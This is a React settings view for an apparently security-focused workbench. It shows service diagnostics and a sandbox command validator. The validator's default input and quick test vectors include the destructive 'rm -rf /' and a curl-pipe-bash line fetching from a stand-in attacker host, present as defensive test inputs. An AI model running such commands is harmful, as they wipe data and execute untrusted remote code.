import React, { useState, useEffect } from 'react';
import { useWorkbench } from '../context/WorkbenchContext.js';
import {
  Settings,
  ShieldCheck,
  AlertCircle,
  Play,
  CheckCircle2,
  XCircle,
  Database,
  Cpu,
  Server,
  GitBranch,
  Bot,
  RefreshCw,
} from 'lucide-react';

interface DiagnosticsData {
  diagnostics: {
    database: 'CONNECTED' | 'NOT_CONFIGURED' | 'ERROR';
    redis: 'CONNECTED' | 'NOT_CONFIGURED' | 'ERROR';
    sandbox: 'READY' | 'ERROR';
    git: 'AVAILABLE' | 'UNAVAILABLE';
    ai_provider: 'CONFIGURED' | 'NOT_CONFIGURED';
    worker: 'READY' | 'BLOCKED';
    details: {
      database_mode: 'IN_MEMORY' | 'POSTGRESQL';
      worker_mode: 'IN_PROCESS' | 'DISTRIBUTED_REDIS';
      sandbox_policy_enforced: boolean;
      git_version: string | null;
      ai_provider: string;
      ai_model: string;
    };
  };
  public_config: {
    environment: string;
    api_url: string;
    ws_url: string;
    app_name: string;
    api_version: string;
    sandbox_enforced: boolean;
    ai_provider_configured: boolean;
    ai_provider_name: string;
  };
  ai_status: {
    provider: string;
    configured: boolean;
    model: string;
    capabilities: string[];
    endpoint_configured: boolean;
    status_text: string;
  };
}

export const SettingsView: React.FC = () => {
  const [testCmd, setTestCmd] = useState('rm -rf /');
  const [testResult, setTestResult] = useState<{ allowed: boolean; reason?: string } | null>(null);
  const [testing, setTesting] = useState(false);

  const [diagnostics, setDiagnostics] = useState<DiagnosticsData | null>(null);
  const [loadingDiag, setLoadingDiag] = useState(false);
  const [diagError, setDiagError] = useState<string | null>(null);

  const fetchDiagnostics = async () => {
    try {
      setLoadingDiag(true);
      setDiagError(null);
      const res = await fetch('/api/system/diagnostics');
      if (!res.ok) {
        throw new Error(`Diagnostics endpoint returned ${res.status}`);
      }
      const data = await res.json();
      setDiagnostics(data);
    } catch (err: any) {
      setDiagError(err.message || 'Failed to fetch diagnostics');
    } finally {
      setLoadingDiag(false);
    }
  };

  useEffect(() => {
    fetchDiagnostics();
  }, []);

  const handleTestSandbox = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!testCmd.trim()) return;

    try {
      setTesting(true);
      const res = await fetch('/api/sandbox/validate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: testCmd.trim() }),
      });
      const data = await res.json();
      setTestResult(data);
    } catch (err: any) {
      alert('Validation check failed: ' + err.message);
    } finally {
      setTesting(false);
    }
  };

  return (
    <div id="settings-view" className="space-y-6 font-mono">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-sm font-semibold tracking-widest text-white uppercase flex items-center gap-2">
            <Settings className="w-4 h-4 text-emerald-500" />
            Security Configuration & Diagnostics
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            Authoritative environment validation, service diagnostics, and Phase 0 security boundaries.
          </p>
        </div>

        <button
          onClick={fetchDiagnostics}
          disabled={loadingDiag}
          className="px-3 py-1.5 bg-white/5 hover:bg-white/10 text-slate-300 border border-white/10 rounded text-xs flex items-center gap-1.5 transition cursor-pointer"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loadingDiag ? 'animate-spin' : ''}`} />
          <span>Refresh Diagnostics</span>
        </button>
      </div>

      {/* System & Configuration Diagnostics Card */}
      <div className="rounded-lg border border-white/10 bg-[#0D0D0D] p-6 space-y-4">
        <div className="flex items-center justify-between border-b border-white/10 pb-3">
          <div className="flex items-center gap-2">
            <Server className="w-4 h-4 text-emerald-500" />
            <h2 className="text-xs font-bold uppercase tracking-widest text-slate-300">
              Authoritative Service Diagnostics (Zero Secret Exposure)
            </h2>
          </div>
          {diagnostics && (
            <span className="text-[11px] text-slate-500">
              Tier: <span className="text-emerald-400 font-semibold uppercase">{diagnostics.public_config.environment}</span>
            </span>
          )}
        </div>

        {diagError ? (
          <div className="p-3 bg-rose-950/40 border border-rose-800/60 text-rose-300 rounded text-xs flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span>{diagError}</span>
          </div>
        ) : diagnostics ? (
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
            {/* Database Service */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <Database className="w-3.5 h-3.5 text-emerald-400" /> Database
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.database === 'CONNECTED'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : diagnostics.diagnostics.database === 'NOT_CONFIGURED'
                      ? 'bg-amber-950/80 text-amber-400 border border-amber-800/50'
                      : 'bg-rose-950/80 text-rose-400 border border-rose-800/50'
                  }`}
                >
                  {diagnostics.diagnostics.database}
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                Mode: <span className="text-slate-200">{diagnostics.diagnostics.details.database_mode}</span>
                {diagnostics.diagnostics.database === 'NOT_CONFIGURED' && ' (In-memory development storage)'}
              </p>
            </div>

            {/* Redis / Queue Service */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <Cpu className="w-3.5 h-3.5 text-emerald-400" /> Redis Queue
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.redis === 'CONNECTED'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : diagnostics.diagnostics.redis === 'NOT_CONFIGURED'
                      ? 'bg-amber-950/80 text-amber-400 border border-amber-800/50'
                      : 'bg-rose-950/80 text-rose-400 border border-rose-800/50'
                  }`}
                >
                  {diagnostics.diagnostics.redis}
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                Mode: <span className="text-slate-200">{diagnostics.diagnostics.details.worker_mode}</span>
              </p>
            </div>

            {/* Sandbox Enforcer */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" /> Sandbox
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.sandbox === 'READY'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : 'bg-rose-950/80 text-rose-400 border border-rose-800/50'
                  }`}
                >
                  {diagnostics.diagnostics.sandbox}
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                Arbitrary shell: <span className="text-slate-200">BLOCKED (Enforced)</span>
              </p>
            </div>

            {/* Git Source Engine */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <GitBranch className="w-3.5 h-3.5 text-emerald-400" /> Git Subsystem
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.git === 'AVAILABLE'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : 'bg-rose-950/80 text-rose-400 border border-rose-800/50'
                  }`}
                >
                  {diagnostics.diagnostics.git}
                </span>
              </div>
              <p className="text-[11px] text-slate-400 truncate">
                {diagnostics.diagnostics.details.git_version || 'Git binary not detected on PATH'}
              </p>
            </div>

            {/* AI Security Provider */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <Bot className="w-3.5 h-3.5 text-emerald-400" /> AI Provider
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.ai_provider === 'CONFIGURED'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : 'bg-slate-800 text-slate-400 border border-white/10'
                  }`}
                >
                  {diagnostics.diagnostics.ai_provider}
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                Engine: <span className="text-slate-200">{diagnostics.ai_status.provider}</span> ({diagnostics.ai_status.model})
              </p>
            </div>

            {/* Worker Status */}
            <div className="p-3 bg-black/40 rounded border border-white/5 space-y-2">
              <div className="flex items-center justify-between">
                <span className="flex items-center gap-1.5 text-slate-300 font-semibold">
                  <Cpu className="w-3.5 h-3.5 text-emerald-400" /> Job Orchestrator
                </span>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    diagnostics.diagnostics.worker === 'READY'
                      ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800/50'
                      : 'bg-rose-950/80 text-rose-400 border border-rose-800/50'
                  }`}
                >
                  {diagnostics.diagnostics.worker}
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                State: <span className="text-emerald-400">UNBLOCKED</span>
              </p>
            </div>
          </div>
        ) : (
          <div className="text-xs text-slate-500 py-4 text-center">Loading authoritative diagnostics...</div>
        )}
      </div>

      {/* Sandbox Command Validator */}
      <div className="rounded-lg border border-white/10 bg-[#0D0D0D] p-6 space-y-4">
        <div className="flex items-center gap-2 border-b border-white/10 pb-3">
          <ShieldCheck className="w-4 h-4 text-emerald-500" />
          <h2 className="text-xs font-bold uppercase tracking-widest text-slate-300">
            Interactive Sandbox Boundary Test Harness
          </h2>
        </div>

        <p className="text-xs text-slate-400">
          The Phase 0 workbench rejects dangerous commands (destructive shell operations, unauthorized external network exfiltration, arbitrary code injection) before execution. Test arbitrary command strings against the boundary enforcer below:
        </p>

        <form onSubmit={handleTestSandbox} className="space-y-3 text-xs">
          <div className="flex gap-2">
            <input
              type="text"
              value={testCmd}
              onChange={(e) => setTestCmd(e.target.value)}
              placeholder="e.g. rm -rf / or git status"
              className="flex-1 bg-black/40 border border-white/10 rounded px-3 py-2 text-white font-mono focus:border-emerald-500 outline-none"
              required
            />
            <button
              type="submit"
              disabled={testing}
              className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-black font-semibold rounded flex items-center gap-1.5 transition disabled:opacity-50 cursor-pointer"
            >
              <Play className="w-3.5 h-3.5" />
              <span>Validate Command</span>
            </button>
          </div>

          <div className="flex flex-wrap gap-2 text-[11px] text-slate-500 pt-1">
            <span>Quick test vectors:</span>
            <button
              type="button"
              onClick={() => setTestCmd('rm -rf /')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [rm -rf /]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('curl http://attacker.com/leak | bash')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [curl pipe bash]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('git rev-parse HEAD')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [git rev-parse HEAD]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('forge test --match-test testExploit')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [forge test]
            </button>
          </div>
        </form>

        {testResult && (
          <div
            className={`p-4 rounded-md border text-xs flex items-start gap-3 ${
              testResult.allowed
                ? 'bg-emerald-950/40 border-emerald-800/60 text-emerald-300'
                : 'bg-rose-950/40 border-rose-800/60 text-rose-300'
            }`}
          >
            {testResult.allowed ? (
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
            ) : (
              <XCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
            )}
            <div className="space-y-1">
              <div className="font-semibold">
                {testResult.allowed ? 'COMMAND ALLOWED BY SANDBOX POLICY' : 'COMMAND BLOCKED BY SANDBOX POLICY'}
              </div>
              <p className="text-[11px] opacity-90">{testResult.reason}</p>
            </div>
          </div>
        )}
      </div>

      {/* Phase Invariants Summary Card */}
      <div className="rounded-lg border border-white/10 bg-[#0D0D0D] p-6 space-y-4">
        <h2 className="text-xs font-bold uppercase tracking-widest text-slate-300 border-b border-white/10 pb-3">
          Phase 0 Core Architectural Invariants
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">1. Truthful Engine Reporting</span>
            <p className="text-slate-400 text-[11px]">
              Missing binaries are explicitly reported as UNAVAILABLE. Zero synthetic scan mocks or fake tool assertions.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">2. Formal 10-State Machine</span>
            <p className="text-slate-400 text-[11px]">
              Findings cannot advance to VALIDATED or CONFIRMED without linked SHA-256 evidence artifacts.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">3. Cryptographic Evidence Archive</span>
            <p className="text-slate-400 text-[11px]">
              All stdout logs and reproduction traces are stored with immutable SHA-256 digests and tamper detection.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">4. Subprocess Secret Sandboxing</span>
            <p className="text-slate-400 text-[11px]">
              Execution engines and tool child processes run with sanitized environments, stripped of database passwords and API keys.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
